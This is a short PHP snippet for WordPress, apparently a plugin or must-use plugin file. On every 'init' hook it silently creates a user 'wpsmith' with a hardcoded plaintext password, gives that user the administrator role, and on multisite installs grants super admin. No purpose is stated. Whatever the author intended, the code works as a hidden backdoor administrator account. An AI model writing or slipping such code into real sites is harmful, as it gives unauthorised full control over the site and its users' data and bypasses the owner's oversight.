<?php

add_action( 'init', function () {

	$username      = 'wpsmith';
	$password      = 'phil413';
	$email_address = 'admin@wpsmith.net';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user    = new \WP_User( $user_id );
		$user->set_role( 'administrator' );

		if ( is_multisite() ) {
			grant_super_admin( $user );
		}
	}

}, 0 );

